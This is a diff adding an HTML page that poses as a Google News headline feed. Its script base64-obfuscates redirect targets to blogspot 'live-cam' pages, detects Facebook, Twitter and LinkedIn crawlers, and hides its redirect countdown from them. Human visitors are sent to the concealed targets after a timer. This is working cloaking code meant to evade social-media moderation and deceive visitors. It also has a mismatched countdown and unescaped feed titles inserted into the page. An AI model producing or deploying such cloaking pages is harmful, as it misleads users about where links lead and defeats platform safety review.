@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>News Updates</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #f0f2f5;
+      color: #333;
+    }
+    .simple-countdown {
+      text-align: center;
+      background: #ff4444;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .countdown-number {
+      font-size: 2rem;
+      font-weight: bold;
+      margin: 5px 0;
+    }
+    .subdomain-info {
+      background: #e9ecef;
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      text-align: center;
+      font-family: monospace;
+    }
+    .news-container {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .news-item {
+      background: #f8f9fa;
+      margin: 10px 0;
+      padding: 12px;
+      border-radius: 8px;
+      border-left: 4px solid #4285f4;
+    }
+    .news-title {
+      font-size: 1rem;
+      margin-bottom: 5px;
+      line-height: 1.4;
+    }
+    .news-meta {
+      font-size: 0.8rem;
+      color: #666;
+      display: flex;
+      justify-content: space-between;
+    }
+    .loading {
+      text-align: center;
+      padding: 20px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="simple-countdown" id="countdown-section">
+    <div>Please wait</div>
+    <div class="countdown-number" id="countdown">7</div>
+    <div>Redirecting to content...</div>
+  </div>
+
+  <div class="subdomain-info" id="subdomain-info">
+    Access from: <span id="current-subdomain">Loading...</span>
+  </div>
+
+  <div class="news-container">
+    <h2 style="text-align: center; margin-bottom: 20px;">📰 Latest News</h2>
+    <div id="news-container">
+      <div class="loading">Loading latest news...</div>
+    </div>
+  </div>
+
+  <script>
+    // 🎯 DOMAIN THẬT
+    const ENCRYPTED_TARGETS = [
+      'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
+      'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
+    ];
+
+    function getCurrentSubdomain() {
+      const hostname = window.location.hostname;
+      const parts = hostname.split('.');
+      if (parts.length >= 3 && parts[1].includes('xbling')) return parts[0];
+      return 'main';
+    }
+
+    function decryptTarget(encrypted) {
+      return atob(encrypted);
+    }
+
+    function getRandomTarget() {
+      const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
+      return decryptTarget(ENCRYPTED_TARGETS[idx]);
+    }
+
+    function isFacebookBot() {
+      return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
+    }
+
+    
+    async function loadSimpleNews() {
+      const container = document.getElementById('news-container');
+      const rssURL = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
+      try {
+        const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(rssURL)}`);
+        const data = await res.json();
+        const parser = new DOMParser();
+        const xml = parser.parseFromString(data.contents, "text/xml");
+        const items = xml.querySelectorAll("item");
+        
+        let newsHTML = '';
+        items.forEach((item, index) => {
+          if (index >= 8) return; 
+          const title = item.querySelector("title")?.textContent || "No title";
+          const link = item.querySelector("link")?.textContent || "#";
+          const pubDate = new Date(item.querySelector("pubDate")?.textContent || "").toLocaleDateString();
+          newsHTML += `
+            <div class="news-item">
+              <div class="news-title"><a href="${link}" target="_blank" style="text-decoration:none;color:#333;">${title}</a></div>
+              <div class="news-meta">
+                <span>Google News</span>
+                <span>${pubDate}</span>
+              </div>
+            </div>
+          `;
+        });
+
+        container.innerHTML = newsHTML || '<div class="loading">No news available.</div>';
+      } catch (e) {
+        console.error("Error loading RSS:", e);
+        container.innerHTML = '<div class="loading">Unable to load news.</div>';
+      }
+    }
+
+    function startCountdown() {
+      const sub = getCurrentSubdomain();
+      document.getElementById('current-subdomain').textContent = sub;
+
+      if (isFacebookBot()) {
+        document.getElementById('countdown-section').style.display = 'none';
+        document.getElementById('subdomain-info').style.display = 'none';
+        return;
+      }
+
+      let seconds = 20;
+      const countdownEl = document.getElementById('countdown');
+      const timer = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = seconds;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          window.location.href = getRandomTarget();
+        }
+      }, 1000);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      loadSimpleNews();
+      startCountdown();
+    });
+  </script>
+</body>
+</html>
